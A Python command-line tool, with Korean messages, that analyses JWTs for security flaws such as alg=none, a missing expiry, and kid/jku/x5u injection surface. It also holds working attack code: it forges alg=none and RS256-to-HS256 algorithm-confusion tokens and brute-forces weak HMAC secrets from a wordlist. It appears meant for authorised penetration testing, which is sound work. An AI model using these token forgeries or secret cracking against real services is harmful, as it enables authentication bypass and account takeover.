#!/usr/bin/env python3
"""JWT structural/security analyzer.

Decodes a JWT, flags common misconfigurations (alg=none, missing exp,
kid/jku/x5u injection surface, algorithm confusion exposure), and can
optionally:
  - brute-force a weak HMAC secret against a wordlist (local computation
    only, no network calls)
  - generate an alg=none PoC variant
  - generate an RS256->HS256 "algorithm confusion" PoC variant when given
    the server's public key

This tool only ANALYZES and GENERATES candidate tokens locally. It never
sends anything to a server itself -- testing a generated variant against a
real target is the user's own action, and only appropriate against systems
you're authorized to test.

Usage:
    python jwt_analyzer.py <token>
    python jwt_analyzer.py <token> --crack-secret
    python jwt_analyzer.py <token> --crack-secret --wordlist common-passwords.txt --limit 50000
    python jwt_analyzer.py <token> --gen-none
    python jwt_analyzer.py <token> --confusion-pubkey server_public_key.pem
    python jwt_analyzer.py --file token.txt
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import logging
import sys
import time
from dataclasses import dataclass
from pathlib import Path

logger = logging.getLogger("jwt_analyzer")

SECLISTS_PASSWORDS_DIR = Path(__file__).resolve().parent.parent / "SecLists-master" / "Passwords"
DEFAULT_SECRET_WORDLIST = SECLISTS_PASSWORDS_DIR / "scraped-JWT-secrets.txt"
DEFAULT_CRACK_LIMIT = 500_000

_HMAC_ALGS: dict[str, "hashlib._Hash"] = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
_ASYMMETRIC_ALGS = ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512")


# ---------------------------------------------------------------------------
# base64url helpers
# ---------------------------------------------------------------------------
def b64url_decode(segment: str) -> bytes:
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


# ---------------------------------------------------------------------------
# Parsing
# ---------------------------------------------------------------------------
@dataclass
class Finding:
    severity: str  # INFO / WARNING / VULNERABLE
    message: str


@dataclass
class JwtParts:
    header_raw: str
    payload_raw: str
    signature_raw: str
    header: dict
    payload: dict
    signature: bytes


def parse_jwt(token: str) -> JwtParts:
    token = token.strip()
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"3파트(header.payload.signature) 구조가 아님 (segment {len(parts)}개 발견)")
    header_raw, payload_raw, signature_raw = parts
    try:
        header = json.loads(b64url_decode(header_raw))
        payload = json.loads(b64url_decode(payload_raw))
    except (ValueError, UnicodeDecodeError) as exc:
        raise ValueError(f"base64url 디코딩 또는 JSON 파싱 실패: {exc}") from exc
    signature = b64url_decode(signature_raw) if signature_raw else b""
    return JwtParts(header_raw, payload_raw, signature_raw, header, payload, signature)


# ---------------------------------------------------------------------------
# Structural / security analysis
# ---------------------------------------------------------------------------
def analyze_structure(jwt: JwtParts) -> list[Finding]:
    findings: list[Finding] = []
    alg = str(jwt.header.get("alg", ""))
    alg_upper = alg.upper()

    if alg.lower() == "none":
        findings.append(Finding("VULNERABLE", "alg=none: 서버가 이를 받아들이면 서명 검증 없이 payload 위조 가능."))
    elif not jwt.signature:
        findings.append(Finding("WARNING", "서명이 비어 있음 (alg은 none이 아님) — 토큰이 잘렸거나 서명이 누락됨."))

    if "exp" not in jwt.payload:
        findings.append(Finding("WARNING", "exp(만료시간) claim 없음 — 토큰이 영구적으로 유효할 수 있음."))
    else:
        exp = jwt.payload.get("exp")
        if isinstance(exp, (int, float)):
            remaining = exp - time.time()
            if remaining < 0:
                findings.append(Finding("INFO", f"토큰 만료됨 ({-remaining:.0f}초 전)."))
            elif remaining > 60 * 60 * 24 * 365:
                findings.append(Finding("WARNING", f"만료까지 {remaining / 86400:.0f}일 남음 — 과도하게 긴 유효기간."))

    if "iat" not in jwt.payload:
        findings.append(Finding("INFO", "iat(발급시간) claim 없음."))

    if "kid" in jwt.header:
        findings.append(
            Finding(
                "WARNING",
                f"kid 헤더 존재 ({jwt.header['kid']!r}) — 서버가 이 값으로 키 파일/DB를 직접 조회한다면 "
                "경로 조작(path traversal)이나 SQL 인젝션 벡터가 될 수 있음.",
            )
        )
    if "jku" in jwt.header:
        findings.append(
            Finding("WARNING", f"jku 헤더 존재 ({jwt.header['jku']!r}) — 서버가 이 URL에서 공개키를 fetch한다면 SSRF/키 위조 벡터.")
        )
    if "x5u" in jwt.header:
        findings.append(Finding("WARNING", "x5u 헤더 존재 — 서버가 이 URL의 인증서를 신뢰한다면 위조 인증서 주입 벡터."))

    if alg_upper in _HMAC_ALGS:
        findings.append(Finding("INFO", f"{alg}: 대칭키(HMAC) 서명 — 시크릿이 약하면 --crack-secret으로 무차별 대입 가능."))
    elif alg_upper in _ASYMMETRIC_ALGS:
        findings.append(
            Finding(
                "INFO",
                f"{alg}: 비대칭키 서명 — 서버 검증 로직이 공개키를 HMAC 시크릿으로 오인하면 "
                "algorithm confusion 공격 가능 (--confusion-pubkey 참고).",
            )
        )
    elif alg_upper and alg_upper not in ("NONE",):
        findings.append(Finding("INFO", f"알 수 없거나 드문 alg 값: {alg!r}"))

    return findings


# ---------------------------------------------------------------------------
# PoC variant generators (local only -- never sent anywhere by this tool)
# ---------------------------------------------------------------------------
def gen_none_alg_variant(jwt: JwtParts) -> str:
    header = dict(jwt.header)
    header["alg"] = "none"
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(jwt.payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}."


def gen_confusion_variant(jwt: JwtParts, pubkey_bytes: bytes, target_alg: str = "HS256") -> str:
    """Classic RS/ES/PS -> HS confusion PoC: signs with HMAC using the
    server's own public key bytes as the secret. Only meaningful against a
    server whose JWT library naively uses one 'key' parameter for both
    RSA verification and HMAC verification."""
    digestmod = _HMAC_ALGS.get(target_alg.upper())
    if digestmod is None:
        raise ValueError(f"target_alg must be one of {list(_HMAC_ALGS)}, got {target_alg!r}")
    header = dict(jwt.header)
    header["alg"] = target_alg.upper()
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(jwt.payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(pubkey_bytes, signing_input, digestmod).digest()
    return f"{header_b64}.{payload_b64}.{b64url_encode(sig)}"


# ---------------------------------------------------------------------------
# Weak-secret brute force (local HMAC recomputation, no network)
# ---------------------------------------------------------------------------
def resolve_wordlist_path(spec: str) -> Path:
    direct = Path(spec)
    if direct.is_file():
        return direct
    for candidate in (SECLISTS_PASSWORDS_DIR / spec, SECLISTS_PASSWORDS_DIR / "Common-Credentials" / spec):
        if candidate.is_file():
            return candidate
    raise FileNotFoundError(f"Wordlist not found: {spec!r} (checked as a direct path and under {SECLISTS_PASSWORDS_DIR})")


def crack_secret(jwt: JwtParts, wordlist_path: Path, limit: int) -> tuple[str | None, int]:
    alg_upper = str(jwt.header.get("alg", "")).upper()
    digestmod = _HMAC_ALGS.get(alg_upper)
    if digestmod is None:
        raise ValueError(f"alg={alg_upper!r}는 HMAC이 아니라 secret brute-force 대상이 아님 (HS256/HS384/HS512만 지원).")

    signing_input = f"{jwt.header_raw}.{jwt.payload_raw}".encode()
    target_sig = jwt.signature

    count = 0
    with wordlist_path.open("r", encoding="utf-8", errors="replace") as fh:
        for line in fh:
            word = line.rstrip("\n\r")
            if not word:
                continue
            count += 1
            if count > limit:
                break
            candidate = hmac.new(word.encode("utf-8"), signing_input, digestmod).digest()
            if hmac.compare_digest(candidate, target_sig):
                return word, count
    return None, count


def _emit_json(report: dict, output_file: str | None) -> None:
    text = json.dumps(report, indent=2, ensure_ascii=False)
    if output_file:
        Path(output_file).write_text(text, encoding="utf-8")
    else:
        print(text)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog="jwt_analyzer", description="JWT structural/security analyzer.")
    parser.add_argument("token", nargs="?", default=None, help="JWT string (header.payload.signature)")
    parser.add_argument("--file", default=None, help="Read the token from this file instead of the positional arg")
    parser.add_argument("--crack-secret", action="store_true", help="Brute-force the HMAC secret against a wordlist (HS256/384/512 only)")
    parser.add_argument(
        "--wordlist",
        default=str(DEFAULT_SECRET_WORDLIST),
        help="Path or short name for --crack-secret (default: SecLists scraped-JWT-secrets.txt)",
    )
    parser.add_argument("--limit", type=int, default=DEFAULT_CRACK_LIMIT, help=f"Max words to try for --crack-secret (default {DEFAULT_CRACK_LIMIT})")
    parser.add_argument("--gen-none", action="store_true", help="Print an alg=none PoC variant of the token")
    parser.add_argument("--confusion-pubkey", default=None, help="Path to the server's public key (PEM) to generate an RS/ES/PS->HS confusion PoC")
    parser.add_argument("--confusion-alg", default="HS256", choices=list(_HMAC_ALGS), help="Target HMAC alg for --confusion-pubkey (default HS256)")
    parser.add_argument("--output", choices=["console", "json"], default="console", help="Report format (default console)")
    parser.add_argument("--output-file", default=None, help="Write report to this path instead of stdout (both --output modes)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose logging")
    return parser


def _interactive_argv(parser: argparse.ArgumentParser) -> list[str] | None:
    """Number-driven interactive menu: builds an argv list from the parser's own
    option definitions, so it stays in sync automatically as options change."""
    positionals = [a for a in parser._actions if not a.option_strings]
    optionals = [a for a in parser._actions if a.option_strings and a.dest != "help"]

    print(f"\n=== {parser.prog} 대화형 모드 ===")
    print("(필수 값부터 입력 -> 옵션은 번호로 설정/토글 -> 0=실행, q=취소)\n")

    pos_values: dict[str, str] = {}
    for act in positionals:
        optional_pos = act.nargs == "?"
        suffix = " [선택, Enter=생략]" if optional_pos else ""
        label = f"{act.dest}" + (f" ({act.help})" if act.help else "") + suffix
        while True:
            v = input(f"{label}: ").strip()
            if v:
                pos_values[act.dest] = v
                break
            if optional_pos:
                break
            print("  필수 입력값입니다.")

    opt_values: dict[str, object] = {}
    while True:
        print("\n-- 옵션 목록 --")
        for i, act in enumerate(optionals, start=1):
            name = act.option_strings[0]
            if isinstance(act, argparse._StoreTrueAction):
                state = "ON" if opt_values.get(act.dest) else "off"
            elif isinstance(act, argparse._AppendAction):
                cur = opt_values.get(act.dest) or []
                state = f"{len(cur)}개 등록됨" if cur else "(없음)"
            elif act.dest in opt_values:
                v = opt_values[act.dest]
                state = "(기본값 사용)" if v is True else str(v)
            else:
                state = f"(기본값: {act.default})" if act.default is not None else "(미설정)"
            req = " *필수" if getattr(act, "required", False) else ""
            choices = f" 선택지:{','.join(map(str, act.choices))}" if act.choices else ""
            print(f"  {i:>2}. {name:<20} = {state:<22}{req}  {act.help or ''}{choices}")
        choice = input("\n번호 선택 (0=실행, q=취소): ").strip().lower()
        if choice == "q":
            return None
        if choice == "0":
            missing = [a.option_strings[0] for a in optionals if getattr(a, "required", False) and a.dest not in opt_values]
            if missing:
                print(f"  필수 옵션 미설정: {', '.join(missing)}")
                continue
            break
        if not choice.isdigit() or not (1 <= int(choice) <= len(optionals)):
            print("  잘못된 번호입니다.")
            continue
        act = optionals[int(choice) - 1]
        if isinstance(act, argparse._StoreTrueAction):
            opt_values[act.dest] = not opt_values.get(act.dest, False)
        elif isinstance(act, argparse._AppendAction):
            print(f"  {act.option_strings[0]} 값 반복 입력, 빈 줄이면 종료:")
            items: list[str] = []
            while True:
                v = input("    + ").strip()
                if not v:
                    break
                items.append(v)
            opt_values[act.dest] = items
        elif act.nargs == "?":
            v = input(f"  {act.option_strings[0]} 값 (비우고 Enter=기본값 '{act.const}' 사용): ").strip()
            opt_values[act.dest] = v if v else True
        else:
            v = input(f"  {act.option_strings[0]} 값 (빈 줄=설정 해제): ").strip()
            if v:
                opt_values[act.dest] = v
            else:
                opt_values.pop(act.dest, None)

    argv: list[str] = [pos_values[a.dest] for a in positionals if a.dest in pos_values]
    for act in optionals:
        if act.dest not in opt_values:
            continue
        val = opt_values[act.dest]
        if isinstance(act, argparse._StoreTrueAction):
            if val:
                argv.append(act.option_strings[0])
        elif isinstance(act, argparse._AppendAction):
            for item in val:
                argv += [act.option_strings[0], item]
        elif act.nargs == "?":
            argv.append(act.option_strings[0])
            if val is not True:
                argv.append(val)
        else:
            argv += [act.option_strings[0], str(val)]
    return argv


def main(argv: list[str] | None = None) -> int:
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8")
        except (AttributeError, ValueError):
            pass

    parser = build_arg_parser()
    args = parser.parse_args(argv)
    logging.basicConfig(level=logging.DEBUG if args.verbose else logging.INFO, format="%(message)s", stream=sys.stderr)

    if args.file:
        token = Path(args.file).read_text(encoding="utf-8").strip()
    elif args.token:
        token = args.token
    else:
        parser.error("token 인자 또는 --file 중 하나는 필요함")
        return 2

    try:
        jwt = parse_jwt(token)
    except ValueError as exc:
        logger.error("파싱 실패: %s", exc)
        if args.output == "json":
            _emit_json({"error": str(exc)}, args.output_file)
        return 2

    findings = analyze_structure(jwt)
    report: dict = {
        "header": jwt.header,
        "payload": jwt.payload,
        "findings": [{"severity": f.severity, "message": f.message} for f in findings],
    }

    none_variant = gen_none_alg_variant(jwt) if args.gen_none else None
    if none_variant is not None:
        report["gen_none_variant"] = none_variant

    confusion_variant = None
    if args.confusion_pubkey:
        pubkey_bytes = Path(args.confusion_pubkey).read_bytes()
        confusion_variant = gen_confusion_variant(jwt, pubkey_bytes, args.confusion_alg)
        report["confusion_variant"] = {"alg": args.confusion_alg, "token": confusion_variant}

    crack_result: dict | None = None
    if args.crack_secret:
        try:
            wordlist_path = resolve_wordlist_path(args.wordlist)
        except FileNotFoundError as exc:
            logger.error(str(exc))
            if args.output == "json":
                _emit_json({"error": str(exc)}, args.output_file)
            return 2
        start = time.monotonic()
        found, tried = crack_secret(jwt, wordlist_path, args.limit)
        elapsed = time.monotonic() - start
        crack_result = {"wordlist": str(wordlist_path), "tried": tried, "elapsed_seconds": round(elapsed, 1), "found": found}
        report["crack_secret"] = crack_result

    if args.output == "json":
        _emit_json(report, args.output_file)
        return 0

    print("=" * 60)
    print(" JWT Analysis")
    print("=" * 60)
    print("\n[Header]")
    print(json.dumps(jwt.header, indent=2, ensure_ascii=False))
    print("\n[Payload]")
    print(json.dumps(jwt.payload, indent=2, ensure_ascii=False))

    print(f"\n[Findings] ({len(findings)})")
    for f in findings:
        print(f"  {f.severity:<10} {f.message}")

    if none_variant is not None:
        print("\n[alg=none PoC variant]")
        print(f"  {none_variant}")

    if confusion_variant is not None:
        print(f"\n[{args.confusion_alg} confusion PoC variant (signed with public key bytes as HMAC secret)]")
        print(f"  {confusion_variant}")

    if crack_result is not None:
        print(f"\n[Secret brute force] wordlist={crack_result['wordlist']} limit={args.limit}")
        if crack_result["found"] is not None:
            print(f"  FOUND after {crack_result['tried']} word(s) in {crack_result['elapsed_seconds']}s: {crack_result['found']!r}")
        else:
            print(f"  Not found after {crack_result['tried']} word(s) in {crack_result['elapsed_seconds']}s.")

    return 0


if __name__ == "__main__":
    for _stream in (sys.stdout, sys.stderr):
        try:
            _stream.reconfigure(encoding="utf-8")
        except (AttributeError, ValueError):
            pass
    if len(sys.argv) == 1:
        _argv = _interactive_argv(build_arg_parser())
        if _argv is None:
            print("취소됨.")
            raise SystemExit(0)
        raise SystemExit(main(_argv))
    raise SystemExit(main())
